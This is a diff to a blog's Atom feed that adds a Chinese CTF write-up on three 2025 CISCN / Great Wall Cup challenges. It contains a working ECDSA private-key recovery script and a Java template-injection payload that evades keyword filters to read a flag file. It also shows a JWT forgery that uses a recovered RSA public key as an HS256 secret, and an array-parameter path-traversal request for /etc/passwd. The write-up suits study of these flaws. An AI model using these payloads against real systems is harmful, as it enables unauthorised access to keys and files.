@@ -5,19 +5,381 @@
   <link href="https://blog.ne0xsec.cn/" rel="alternate" type="text/html"/>
   <link href="https://blog.ne0xsec.cn/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://blog.ne0xsec.cn/</id>
-  <updated>2026-09-09T00:00:00.000Z</updated>
+  <updated>2025-12-28T00:00:00.000Z</updated>
   <entry>
-    <title>我的第一篇文章</title>
-    <link href="https://blog.ne0xsec.cn/posts/my-first-md/" rel="alternate" type="text/html"/>
-    <id>https://blog.ne0xsec.cn/posts/my-first-md/</id>
-    <published>2026-09-09T00:00:00.000Z</published>
-    <updated>2026-09-09T00:00:00.000Z</updated>
+    <title>【 比赛篇 | CTF 】2025CISCN暨长城杯</title>
+    <link href="https://blog.ne0xsec.cn/posts/2025-cisc--and-great-wall-cup/" rel="alternate" type="text/html"/>
+    <id>https://blog.ne0xsec.cn/posts/2025-cisc--and-great-wall-cup/</id>
+    <published>2025-12-28T00:00:00.000Z</published>
+    <updated>2025-12-28T00:00:00.000Z</updated>
     <summary>显示在文章列表和元数据中的简短摘要。</summary>
-    <content type="html"><![CDATA[<h1>我的第一篇文章</h1>
-<h2>这是一级标题</h2>
-<h3>这是三级标题</h3>
+    <content type="html"><![CDATA[<h2>ECDSA</h2>
+<blockquote>
+<p>题目内容：</p>
+<p>ECDSA一定是安全的吗？提交格式：flag{私钥的MD5值}</p>
+</blockquote>
+<p>题目：</p>
+<pre><code>#!/usr/bin/env python3
+from ecdsa import SigningKey, NIST521p
+from hashlib import sha512
+from Crypto.Util.number import long_to_bytes
+import random
+import binascii
+import sys
+
+digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
+curve_order = NIST521p.order
+priv_int = digest_int % curve_order
+priv_bytes = long_to_bytes(priv_int, 66)
+sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
+vk = sk.verifying_key
+
+f_pub = open("public.pem", "wb")
+f_pub.write(vk.to_pem())
+f_pub.close()
+
+def nonce(i):
+    seed = sha512(b"bias" + bytes([i])).digest()
+    k = int.from_bytes(seed, "big")
+    return k
+
+msgs = [b"message-" + bytes([i]) for i in range(60)]
+sigs = []
+
+for i, msg in enumerate(msgs):
+    k = nonce(i)
+    sig = sk.sign(msg, k=k)
+    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))
+
+f_sig = open("signatures.txt", "w")
+for m, s in sigs:
+    f_sig.write("%s:%s\n" % (m, s))
+f_sig.close()
+</code></pre>
+<p>审计发现，本题考查<code>ECDSA</code>恢复私钥</p>
+<p><code>ECDSA</code>标准加密流程：</p>
+<ol>
+<li>计算消息哈希</li>
+</ol>
+<p>$$
+e = H(m)
+$$</p>
+<ol>
+<li>
+<p>选择随机 nonce <code>k</code></p>
+</li>
+<li>
+<p>计算</p>
+</li>
+</ol>
+<p>$$
+r = (kG)_x \bmod n
+$$</p>
+<ol>
+<li>计算</li>
+</ol>
+<p>$$
+s = k^{-1}(e + dr) \bmod n
+$$</p>
+<p>可以反推私钥<code>d</code>的算法：
+$$
+\boxed{d \equiv (sk - e) \cdot r^{-1} \pmod n}
+$$
+考点在<code>nonce</code>是假的随机数，</p>
+<pre><code>def nonce(i):
+    seed = sha512(b"bias" + bytes([i])).digest()
+    k = int.from_bytes(seed, "big")
+    return k
+
+</code></pre>
+<p>每条消息对应的<code>nonce</code>可预测，所以私钥可以从任意一条签名中直接被恢复。</p>
+<p><code>exp</code>:</p>
+<pre><code>#!/usr/bin/env python3
+import binascii
+from ecdsa import VerifyingKey, NIST521p, SigningKey
+from hashlib import sha512, md5
+from binascii import hexlify
+
+def computer_priv_from_seed():
+    digest = sha512(b"Welcome to this challenge!").digest()
+    curve_order = NIST521p.order
+    priv_int = int.from_bytes(digest, "big") % curve_order
+    priv_bytes = priv_int.to_bytes(66, "big")
+    return priv_int,priv_bytes, digest
+
+def nonce(i):
+    seed = sha512(b"bias" + bytes([i])).digest()
+    k = int.from_bytes(seed, "big")
+    return k
+
+def recover_d_from_signature(msg_bytes, sig_hex):
+    sig = binascii.unhexlify(sig_hex)
+
+    if len(sig) &lt; 132:
+        raise ValueError("Signature length is too short to be valid for NIST521p")
+    r = int.from_bytes(sig[0:66], "big")
+    s = int.from_bytes(sig[66:132], "big")
+    n = int(NIST521p.order)
+    e = int.from_bytes(sha512(msg_bytes).digest(), "big")
+
+    if len(msg_bytes) == 0 or msg_bytes[-1] &gt; 255:
+        raise ValueError("Invalid message format")
+    i = msg_bytes[-1]
+    k = nonce(i)
+    d = ((s * k - e) * pow(r, -1, n)) % n
+    priv_bytes = d.to_bytes(66, "big")
+    return d, priv_bytes, i
+
+def main():
+    priv_int, priv_bytes, digest = computer_priv_from_seed()
+    print("Welcome to this challenge! private key (int):", hexlify(digest).decode())
+    print("Private key (int):", priv_int)
+    print("Private key (hex):", priv_bytes.hex())
+    print("MD5 of private key:", md5(priv_bytes).hexdigest())
+
+    recovered =  set()
+
+    with open("signatures.txt", "r") as f:
+        lines = [ln.strip() for ln in f if ln.strip() and ":" in ln]
+        
+    for ln in lines:
+        print("=============================================")
+        print("Processing line:", ln)
+        left, right = ln.split(":", 1)
+        msg_bytes = bytes.fromhex(left)
+        sig_hex = right.strip()
+        d, pd, i = recover_d_from_signature(msg_bytes, sig_hex)
+        print("Recovered private key (hex):", pd.hex())
+        print("MD5 of recovered private key:", md5(pd).hexdigest())
+        recovered.add(pd.hex())
+
+        with open("public.pem", "rb") as f:
+            pub_pem = f.read()
+            
+        sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
+        vk = sk.verifying_key
+        pem = vk.to_pem()
+        print("+++++++++++++++++++++++++++++++++++++++++++++")
+        if pub_pem.strip() == pem.strip():
+            print("Public key from recovered private key does not match original!")
+        print("Public key from recovered private key matches original:", pem.decode())
+        print(md5(priv_bytes))
+        print(priv_bytes)
+        print("=============================================")
+        priv_str = str(priv_int).encode("ascii")
+        print("Private key as string:", md5(priv_str).hexdigest())
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>确保验证时得出的公钥与题目给的一致：</p>
+<p><img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228173250322.png" alt="image-20251228173250322" /></p>
+<h2>EzJava</h2>
+<blockquote>
+<p>题目内容：</p>
+<p>公告管理系统近期开发测试，为保证测试环境安全，已把常用系统命令全部清除，请尝试读取根目录的敏感文件。（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ）</p>
+</blockquote>
+<p><code>admin/admin123</code>弱口令直接进后台，发现为<code>java</code>的模板渲染，且<code>T(</code>连接起来会替换为<code>NONO</code>,<code>new</code>被替换为<code>WoW</code>。</p>
+<p>最后使用<code>java</code>中的<code>File</code>类的<code>listFiles</code>方法获取根目录下的文件列表，因为其返回结果为数组，需要转换为字符串，所以构造：</p>
+<pre><code>${T (java.util.Arrays).toString(T (java.io.File).listRoots()[0].listFiles().![name])}
+</code></pre>
+<p><img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228154827525.png" alt="image-20251228154827525" /></p>
+<p>继续使用<code>Files</code>类中的<code>readAiiLines</code>方法获取<code>flag</code>值，<code>Paths</code>类的<code>get</code>设定文件名，因为程序会将<code>flag</code>字符串替换为空，所以使用<code>concat</code>进行截断绕过：</p>
+<pre><code>${T (java.nio.file.Files).readAllLines(T (java.nio.file.Paths).get('/'.concat('f').concat('lag_y0u_d0nt_kn0w')))}
+</code></pre>
+<p><img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228155524037.png" alt="image-20251228155524037" /></p>
+<h2>Deprecated</h2>
+<p>今年长城杯决赛原题： <a href="https://asal1n.github.io/2025/05/04/2025%20CCB%20final/index.html">2025 长城杯 final 记录</a></p>
+<p>下载附件后审计，漏洞点有两个：</p>
+<pre><code>router.get('/checkfile', AuthMiddleware, async (req, res, next) =&gt; {
+    try{
+        let user = await db.getUser(req.data.username);
+        if (user === undefined) {
+            return res.send(`user ${req.data.username} doesn't exist.`);
+        }
+        if (req.data.username === 'admin' &amp;&amp; req.data.priviledge==='File-Priviledged-User'){
+            let file=req.query.file;
+            if (!file) {
+                return res.send('File name not specified.');
+            }
+            if (!allowedFile(file)) {
+                return res.send('File type not allowed.');
+            }
+            try{
+                if (file.includes(' ') || file.includes('/') || file.includes('..')) {
+                    return res.send('Invalid filename!');
+                }
+            }
+            catch(err){
+                return res.send('An error occured!');
+            }
+
+            if (file.length &gt; 10) {
+                file = file.slice(0, 10);
+            }
+            const returned = path.resolve('./' + file);
+            fs.readFile(returned, (err) =&gt; {
+                if (err) {
+                    return res.send('An error occured!');
+                }
+                res.sendFile(returned);
+            });
+        }
+        else{
+            return res.send('Sorry Only priviledged Admin can check the file.').status(403);
+        }
+
+    }catch (err){
+        return next(err);
+    }
+});
+
+
+</code></pre>
+<p><code>checkfile</code>路由存在文件读取。</p>
+<pre><code>const allowedFile = (file) =&gt; {
+    const format = file.slice(file.indexOf('.') + 1);
+    return format == 'log';
+};
+</code></pre>
+<p>这里可以绕过扩展名：</p>
+<p><img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228212543101.png" alt="image-20251228212543101" /></p>
+<p>这里可以打文件读取：</p>
+<pre><code> const returned = path.resolve('./' + file);
+</code></pre>
+<p>看下效果：
+<img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228213642754.png" alt="image-20251228213642754" /></p>
+<p>然后<code>res.sendFile(returned);</code>程序就会获取服务器上存在的文件，发送到客户端。</p>
+<p>这个基本就是获取<code>flag</code>的核心所在，剩下继续看：
+先看第一层过滤：</p>
+<pre><code>let user = await db.getUser(req.data.username);
+        if (user === undefined) {
+            return res.send(`user ${req.data.username} doesn't exist.`);
+        }
+        if (req.data.username === 'admin' &amp;&amp; req.data.priviledge==='File-Priviledged-User'){
+</code></pre>
+<p>这里需要伪造<code>jwt</code>，并且<code>jwt</code>的值需要等于这两个。</p>
+<p>首先注册两个用户，获取两个用户的<code>jwt</code>：</p>
+<p>使用<a href="https://github.com/silentsignal/rsa_sign2n/tree/release/standalone">rsa_sign2n/standalone at release · silentsignal/rsa_sign2n</a>爆破公钥，爆破到公钥之后，利用<code>python</code>生成相应的<code>jwt</code>：</p>
+<pre><code>from pathlib import Path
+import jwt
+import pickle
+import base64
+import encodings
+
+path = Path('.')
+for file in path.glob('*.pem'):
+    with open(file.name, 'rb') as key:
+        token=jwt.encode(
+            payload={
+                "username": "admin",
+                "priviledge": "File-Priviledged-User",
+                "iat": 1766911284,
+            },
+            key=key.read(),
+            algorithm='HS256'
+        )
+        print(token)
+        print("---")
+</code></pre>
+<p>参考https://www.caterpie771.cn/archives/347#GeekChalleng2024_jwt_pickle</p>
+<p>这个时候就获得了<code>admin</code>用户的<code>jwt</code>。接下来绕过：</p>
+<pre><code> if (file.includes(' ') || file.includes('/') || file.includes('..'))
+</code></pre>
+<p>这里只需要传入数组就可以被绕过。</p>
+<p>写一个最小<code>demo</code>：</p>
+<pre><code>const express = require('express');
+const fs = require('fs');
+const { type } = require('os');
+const path = require('path');
+
+const app = express();
+
+const allowedFile = (file) =&gt; {
+    const format = file.slice(file.indexOf('.') + 1);
+    return format == 'log';
+};
+
+app.get('/read', (req, res, next) =&gt; {
+    let file = req.query['file[]'];   // 让其接收file[]达到效果 ← 浏览器 ?file=xxx.log
+    console.log('[+] req.query:', req.query);
+    console.log('[+] req.query.file:', req.query.file);
+
+    if (!file) {
+        return res.send('File name not specified.');
+    }
+
+    if (!allowedFile(file)) {
+        return res.send('File type not allowed.');
+    }
+
+    try {
+        if (file.includes(' ') || file.includes('/') || file.includes('..')) {
+            return res.send('Invalid filename!');
+        }
+    } catch (err) {
+        return res.send('An error occured!');
+    }
+
+    if (file.length &gt; 10) {
+        file = file.slice(0, 10);
+    }
+
+    const returned = path.resolve('./' + file);
+    console.log('[+] resolved path:', returned);
+
+    fs.readFile(returned, (err) =&gt; {
+        if (err) {
+            return res.send('An error occured!');
+        }
+        res.sendFile(returned);
+    });
+});
+
+app.listen(3000, () =&gt; {
+    console.log('Listening on http://localhost:3000');
+});
+
+
+</code></pre>
+<p>由于本地原因，漏洞点体现的不明显，当我们传入数组类型时：</p>
+<pre><code>http://localhost:3000/read?file[]=&amp;file[]=&amp;file[]=&amp;file[]=../../../../../etc/passwd&amp;file[]=.&amp;file[]=log
+</code></pre>
+<p>后端传入：
+<img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228224252335.png" alt="image-20251228224252335" /></p>
+<p><img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228224309441.png" alt="image-20251228224309441" /></p>
+<p>设置<code>file</code>为传入的内容：</p>
+<pre><code>const allowedFile = (file) =&gt; {
+    const format = file.slice(file.indexOf('.') + 1);
+    return format == 'log';
+};
+
+const path = require('path');
+
+// === 漏洞 payload（攻击者可控）===
+let file = [ '',  '',  '',  '', '', '', '', '', '../../../../../../../../etc/passwd', '.', 'log' ];
+
+console.log('[+] file payload:', file);
+// === 漏洞核心代码 ===
+if (!allowedFile(file)) {
+    console.log('File type not allowed.');
+} else {
+    console.log('[+] passed allowedFile check');
+}
+if (file.length &gt; 10) {
+    file = file.slice(0, 10);
+}
+const returned = path.resolve('./' + file);
+
+console.log('[+] resolved path:', returned);
+
+
+</code></pre>
+<p>通过控制传入的空数组的值以及路径穿越，就可以任意读取文件：
+<img src="https://xvzhangblog-1320906906.cos.ap-chengdu.myqcloud.com/blog-image/image-20251228223621484.png" alt="image-20251228223621484" /></p>
 ]]></content>
     <author><name>序章</name></author>
-    <category term="写作"/>
+    <category term="CTF比赛篇"/>
   </entry>
 </feed>
